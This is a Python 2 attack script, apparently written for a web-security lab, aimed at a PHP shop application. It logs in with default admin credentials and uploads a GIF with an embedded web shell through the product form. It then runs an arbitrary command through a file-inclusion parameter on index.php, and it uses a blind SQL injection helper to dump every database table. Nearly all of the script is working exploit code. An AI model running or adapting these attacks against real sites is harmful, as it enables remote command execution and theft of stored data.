import httplib

import sys

from config import config
from BeautifulSoup import BeautifulSoup
import requests
from blind_sqli import BlindSql


def https(method, path, data=""):

    def get_h(url):
        host_port = 80
        host = url
        host = host[host.find('//') + 2:]
        if host.find(':') > 0:
            host_port = host[host.find(':') + 1:]
            host = host[:host.find(':')]

        if url.startswith('https'):
            host_port = 443

        if host_port == 443:
            h = httplib.HTTPSConnection(host, host_port, timeout=1000)
        else:
            h = httplib.HTTPConnection(host, host_port, timeout=1000)

        return h

    h = get_h(config['url'])
    # Empty header
    header = {}

    try:
        h.request(method, path, data, header)
    except Exception, e:
        print "Exception: %s" % e
    return h


def login(url):
    url_login = url + "/login.php"
    login_data = {"login": "admin", "password": "admin", "submit": "submit"}
    s = requests.session()
    s.post(url_login, login_data)
    return s


def up_tunna_shell():
    url_addp = config['url'] + "/addproduct.php"
    user = login(config['url'])

    shell = {"imgproduct": open("../img/shell.gif", "r")}
    product_data = {
        "nameproduct": config["script_name"],
        "priceproduct": 1000,
        "quantityproduct": 1000,
        "descproduct": "Img contain shell command",
        "submit": "submit"
    }
    user.post(url_addp, product_data, files=shell)

    # Get path of shell
    h = https("GET", "/list_product.php")
    response = h.getresponse()
    text = response.read()

    soup = BeautifulSoup(text)
    location = ""
    for plist in soup.findAll("div", attrs={"class": "plist"}):
        pdetail = plist.findAll("a", href=True)
        if pdetail[0].text == config["script_name"]:
            location = pdetail[1].contents[0].get("src")
            break

    cmd = config['cmd']
    h2 = https("GET", "/index.php?page={0}&cmd={1}".format(location, cmd.replace(" ", "%20")))
    response = h2.getresponse()

    if response.status == 200:
        print "\n[i] Upload tunna shell successfull"
    else:
        print "\n[i] Upload fail"
        sys.exit(1)


def dumb_all_db(blind_obj):
    result = None
    username, db, version = blind_obj.basic_demo_concept()

    table_names = blind_obj.query('TABLE_NAME', 'information_schema.TABLES', where="TABLE_SCHEMA=database()")
    db_analyze = {}
    for table_name in table_names:
        column_names = blind_obj.query('COLUMN_NAME', 'information_schema.COLUMNS',
                                       where="TABLE_SCHEMA=database() and TABLE_NAME='{0}'".format(table_name[0]))
        temp = [column_name[0] for column_name in column_names]
        db_analyze[table_name[0]] = temp

    for table in db_analyze:
        print '[X] Dump table ' + table
        result = blind_obj.query(','.join(db_analyze[table]), db + '.' + table)
    return result


def banner():
    print ' ___       __   _______   ________  ________    _______          ________  ________  ___       ___'
    print "|\  \     |\  \|\  ___ \ |\   __  \|\   __  \  /  ___  \        |\   ____\|\   __  \|\  \     |\  \\"
    print "\ \  \    \ \  \ \   __/|\ \  \|\ /\ \  \|\  \/__/|_/  /|       \ \  \___|\ \  \|\  \ \  \    \ \  \\"
    print " \ \  \  __\ \  \ \  \_|/_\ \   __  \ \  \\\\\  \__|//  / /        \ \_____  \ \  \\\\\  \ \  \    \ \  \\"
    print "  \ \  \|\__\_\  \ \  \_|\ \ \  \|\  \ \  \\\\\  \  /  /_/__        \|____|\  \ \  \\\\\  \ \  \____\ \  \\"
    print "   \ \____________\ \_______\ \_______\ \_______\|\________\        ____\_\  \ \_____  \ \_______\ \__\\"
    print "    \|____________|\|_______|\|_______|\|_______| \|_______|       |\_________\|___| \__\|_______|\|__|"
    print "                                                                   \|_________|     \|__|"


if __name__ == '__main__':
    banner()
    vulnerable_url = config['vulnerable_url']
    blind = BlindSql(vulnerable_url, verbose=False)
    dumb_all_db(blind)

